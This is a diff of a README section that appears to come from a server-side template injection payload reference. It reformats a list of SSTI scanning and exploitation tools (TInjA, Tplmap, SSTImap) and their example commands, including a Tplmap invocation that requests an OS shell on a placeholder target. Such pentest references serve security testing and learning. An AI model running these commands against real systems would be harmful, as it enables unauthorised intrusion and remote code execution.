@@ -82,44 +82,34 @@
   - [PHP - Plates](#plates)
   - [References](#references)
 
+
 ## Tools
 
-Recommended tools: 
+* [TInjA](https://github.com/Hackmanit/TInjA) - An effiecient SSTI + CSTI scanner which utilizes novel polyglots
+  ```bash
+  tinja url -u "http://example.com/?name=Kirlia" -H "Authentication: Bearer ey..."
+  tinja url -u "http://example.com/" -d "username=Kirlia"  -c "PHPSESSID=ABC123..."
+  ```
 
-[TInjA](https://github.com/Hackmanit/TInjA) - An effiecient SSTI + CSTI scanner which utilizes novel polyglots
+* [Tplmap](https://github.com/epinna/tplmap) - Server-Side Template Injection and Code Injection Detection and Exploitation Tool
+  ```powershell
+  python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell
+  python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=*&comment=supercomment&link"
+  python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link" --level 5 -e jade
+  ```
 
-e.g:
-
-```bash
-tinja url -u "http://example.com/?name=Kirlia" -H "Authentication: Bearer ey..."
-tinja url -u "http://example.com/" -d "username=Kirlia"  -c "PHPSESSID=ABC123..."
-```
-
-[Tplmap](https://github.com/epinna/tplmap) - Server-Side Template Injection and Code Injection Detection and Exploitation Tool
-
-e.g:
-
-```powershell
-python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell
-python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=*&comment=supercomment&link"
-python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link" --level 5 -e jade
-```
-
-[SSTImap](https://github.com/vladko312/SSTImap) - Automatic SSTI detection tool with interactive interface based on [Tplmap](https://github.com/epinna/tplmap)
-
-e.g:
-
-```powershell
-python3 ./sstimap.py -u 'https://example.com/page?name=John' -s
-python3 ./sstimap.py -u 'https://example.com/page?name=Vulnerable*&message=My_message' -l 5 -e jade
-python3 ./sstimap.py -i -A -m POST -l 5 -H 'Authorization: Basic bG9naW46c2VjcmV0X3Bhc3N3b3Jk'
-```
+* [SSTImap](https://github.com/vladko312/SSTImap) - Automatic SSTI detection tool with interactive interface based on [Tplmap](https://github.com/epinna/tplmap)
+  ```powershell
+  python3 ./sstimap.py -u 'https://example.com/page?name=John' -s
+  python3 ./sstimap.py -u 'https://example.com/page?name=Vulnerable*&message=My_message' -l 5 -e jade
+  python3 ./sstimap.py -i -A -m POST -l 5 -H 'Authorization: Basic bG9naW46c2VjcmV0X3Bhc3N3b3Jk'
+  ```
 
 ## Methodology
 
 ![SSTI cheatsheet workflow](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Images/serverside.png?raw=true)
 
----
+
 ## Detection
 
 In most cases, this polyglot payload will trigger an error in presence of a SSTI vulnerability :
